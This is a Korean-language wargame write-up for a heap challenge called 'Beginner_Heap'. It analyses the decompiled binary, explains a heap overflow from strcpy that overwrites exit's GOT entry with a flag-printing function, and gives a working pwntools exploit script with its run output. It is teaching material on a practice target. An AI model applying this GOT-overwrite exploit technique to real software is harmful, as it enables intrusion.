# Beginner_Heap

```c
kimdong@ubuntu  ~/Wargame/200~250  file beginner_heap.bin
beginner_heap.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, inf, stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec beginner_heap.bin
[*] '/home/kimdong/Wargame/200~250/beginner_heap.bin'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
```
이번 바이너리파일은 `bin`파일로 64-bit로 NX-bit가 설정되어있다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./beginner_heap.bin
1234
1234
```
실행시켜보면, 사용자의 입력값을 2번에 걸쳐서 받고 종료되는 형식이다.<br>

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  void *v3; // [rsp+10h] [rbp-1020h]
  void *v4; // [rsp+18h] [rbp-1018h]
  char s; // [rsp+20h] [rbp-1010h]
  unsigned __int64 v6; // [rsp+1028h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v3 = malloc(0x10uLL);
  *(_DWORD *)v3 = 1;
  *((_QWORD *)v3 + 1) = malloc(8uLL);
  v4 = malloc(0x10uLL);
  *(_DWORD *)v4 = 2;
  *((_QWORD *)v4 + 1) = malloc(8uLL);
  fgets(&s, 4096, stdin);
  strcpy(*((char **)v3 + 1), &s);
  fgets(&s, 4096, stdin);
  strcpy(*((char **)v4 + 1), &s);
  exit(0);
}
```
main문은 다음과 같은데, v3에 16byte를 할당시켜주고, v3+1에 8바이트를 할당시킨다.<br>

또한, v4에도 16byte를 할당시켜주고, v4+1에 8바이트를 할당시킨다.<br>

그 후에, `fgets`를 통해 사용자 입력값을 받는데, 4096byte를 받으므로, `Heap Overflow`를 사용할수 있다.<br>

NX-bit가 설정되어있으므로, 덮어씌울 함수를 찾아보자.<br>

```c
void __noreturn sub_400826()
{
  char *lineptr; // [rsp+0h] [rbp-20h]
  size_t n; // [rsp+8h] [rbp-18h]
  FILE *stream; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  lineptr = 0LL;
  n = 0LL;
  stream = fopen("flag", "r");
  getline(&lineptr, &n, stream);
  puts(lineptr);
  fflush(stdout);
  free(lineptr);
  _exit(1);
}
```
ida로 분석하던중 다음과 같은 함수가 있었다.<br>

flag를 띄워주는 함수로 보인다.<br>

위 함수의 주소는 `0x400826`이다.<br>

`strcpy`로 인자를 받기때문에, `v4+1`의 주소에 `Exit()`함수의 주소,그리고 문자열에 `0x400826`을 입력해주면, Got주소를 `sub_400826`의 함수 주소로 바꿀 수 있다.<br>

따라서, `v3+1`에는 8Byte(Body) + 32Byte(Header)를 계산하여 총 40Byte의 dummy값을 준다.<br>

그리고, `v4+1` 주소값에 Exit()함수의 Got주소를 주고, `sub_400826`의 주소를 페이로드로 주면 된다.<br>

---

## Exploit Code

```c

from pwn import *
e = ELF("./beginner_heap.bin")
p = remote("ctf.j0n9hyun.xyz",3016)
exit_got = e.got['exit']

payload = "A"*40
payload += p64(exit_got)
payload2 = p64(0x400826)

p.sendline(payload)
p.sendline(payload2)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame/200~250  python b_heap_ex.py
[*] '/home/kimdong/Wargame/200~250/beginner_heap.bin'
   Arch:     amd64-64-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x400000)
[+] Opening connection to ctf.j0n9hyun.xyz on port 3016: Done
0x601068
[*] Switching to interactive mode
HackCTF{}

[*] Got EOF while reading in interactive
$  
```

## END !
